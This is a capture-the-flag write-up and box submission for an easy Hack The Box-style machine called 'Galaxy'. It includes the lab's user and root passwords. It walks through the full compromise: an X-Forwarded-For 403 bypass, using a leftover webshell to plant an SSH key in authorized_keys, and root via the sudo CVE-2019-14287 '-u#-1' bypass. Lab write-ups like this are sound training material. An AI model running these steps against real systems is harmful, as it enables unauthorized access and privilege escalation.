# [Galaxy]

## Introduction

Galaxy is easy level machine In this challenge, machine hosting a beta website about cosmic facts. The site was vulnerable to bypassing the 403 Forbidden restriction using the X-Forwarded-For header. After successfully bypassing 403 restriction we can see devs left webshell which uses custom web user after user enumeration we can find box vulnerable to CVE-2019-14287 
## Info for HTB

### Access

Passwords:

| User  | Password                            |
| ----- | ----------------------------------- |
| web | Ab401c |
| root  | root8618 |

### Key Processes

1) SSH server on 22 port
2) Apache2 server on 80 port which is vulnerable to http host header
3) There is web shell in /developers directory (in story web site is in beta situation devs unaware of http-header vulnerabilit)
4) For root privilege escalation I set CVE-2019-14287 it is from real world and I believe it suits to box story
5) There is other user besides `web` and `root` (john  lily  tom) and they are dummy users to simulate developers environment and they are shouldn't be rabbit hole because there is nothing there and player will immediatly understand the privelege escalation if they see outdated sudo version (I am okay if htb devs wants to remove them)

### Automation / Crons
There is no automation

### Firewall Rules

There is no firewall rule

### Docker

There is no docker

### Other

1)I made my own ip address to redirect to galaxy.htb in /etc/apache2/sites-avialabel/000-default.conf<br>


# Writeup

# Enumeration

We begin enumeration with nmap tools from ports of target:<br>
`sudo nmap -sC -sV 192.168.2.110 -p- --min-rate=1000 -T4`<br>
`-sC` This flag for basic scripting<br>
`-sV` This flag for to check version<br>
`-p-` To check all ports we do not want to miss any<br>
`-T4` This flag to make scaning slightly faster (default -T3 when you don't specify)<br>
`--min-rate=1000` This is minimum rate of nmap packets<br>

![image](https://github.com/user-attachments/assets/0ceb7925-bc85-46b2-a07c-a15b77d72ce6)

We can see there are 22 and 80 port open. Website has galaxy.htb domain we need to add that domain with it's IP to our /etc/hosts file :<br>
```
echo "192.168.2.110       galaxy.htb" | sudo tee -a /etc/hosts
```
Website looks like blog about cosmos and it is in beta version
<br>
<br>
![image](https://github.com/user-attachments/assets/402a2623-84b0-4d82-97a7-1fbe5681ee21)

Let's enumerate directories and subdirectories using ffuf tool:<br>
```
ffuf -u http://galaxy.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
```
<br>
We find /developers and /photos directories and we are not allowed to access /developers directory<br>

![image](https://github.com/user-attachments/assets/9e1c6a0c-dd6f-4836-85e4-a83ed47ad8f6)

<br>
This message gives idea that maybe developers should be from internal network? Trying to enumerate any subdomains other directory leads us nothing. So we try to find a way to access /developers directory.<br>
Googling 403 bypass error we find [this](https://github.com/justdoston/403-Bypass) documentation.<br>
According to documentation trying to add forward headers with 127.0.0.1 ip will work, because server will think user trying to access from internal IP address.<br>

Let's use proxy forwarding tool such as burp suite to manupulate and try this technique.<br>
![image](https://github.com/user-attachments/assets/605568f6-ecb7-4b28-a860-f5d9f7f40430)


`X-Forwarded-For: 127.0.0.1` header successfuly worked to bypass<br>
![image](https://github.com/user-attachments/assets/3374c55f-ae55-45b0-9f02-3b87781a9c92)



# Foothold

We use same technique to see content of README.md file:<br>
![image](https://github.com/user-attachments/assets/b3785047-9a54-42f9-99ba-cc7f56164d91)
<br>
Not much usefull let's take a look to web.php file<br>
![image](https://github.com/user-attachments/assets/1ce77e27-b006-49be-b5fa-1f321d4f40e7)

<br>
It looks like developers left webshell in developers directory, it is because web site hasn't been finished fully yet<br>
We can copy our own id_rsa.pub (publick key) to web users authorized_keys to login via ssh without a password

```
echo "public key" > /home/web/.ssh/authorized_keys
```


<br>
Let's login using our own ssh with id_rsa for more comfortable and stable shell. If you don't have id_rsa keys create using 

<br>`ssh-keygen -t rsa`<br>

````
┌──(master㉿kali)-[~/.ssh]
└─$ ssh -i id_rsa web@192.168.2.106
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-50-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Jan 24 02:47:24 AM UTC 2025

  System load:  0.0               Processes:               105
  Usage of /:   33.7% of 7.79GB   Users logged in:         0
  Memory usage: 9%                IPv4 address for enp0s3: 192.168.2.106
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


Last login: Fri Jan 24 02:19:46 2025 from 192.168.2.107
$ 
````
user flag can be found in web home directory.<br>

# Privilege Escalation
There is README.md file which admin left message to others!
````
Dear developers!

We need to finish our beta test as fast as possible, for more comfortable evnironment I made other user accessible from web user!
Please do not store any sensitive information ! This is office working computers!
````
After enumeration we can find user web allowed to user /usr/bin/bash as any user except root since it confirms we can use it for other users:
````
User web may run the following commands on galaxy:
    (ALL, !root) NOPASSWD: /usr/bin/bash
````
This means we can use `bash` as other user to access like: `sudo -u john /usr/bin/bash` but sudo forbids if we try to access `root` because of `!root`
Searching other users directory we find nothing but we should pay attention to sudo version:
````
$ sudo -V
Sudo version 1.8.27
Sudoers policy plugin version 1.8.27
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.27
````
This not latest sudo version and after searching from databases we find this version is vulnerable to CVE-2019-14287.<br>
According to [this](https://www.exploit-db.com/exploits/47502) documentation we can bypass using:
````
sudo -u#-1 /usr/bin/bash
````
![image](https://github.com/user-attachments/assets/159f07e4-7200-401b-b264-12246a61181c)
<br>
Here wee can see trying to directly access to the root user didn't work but as expected we can bypass it!


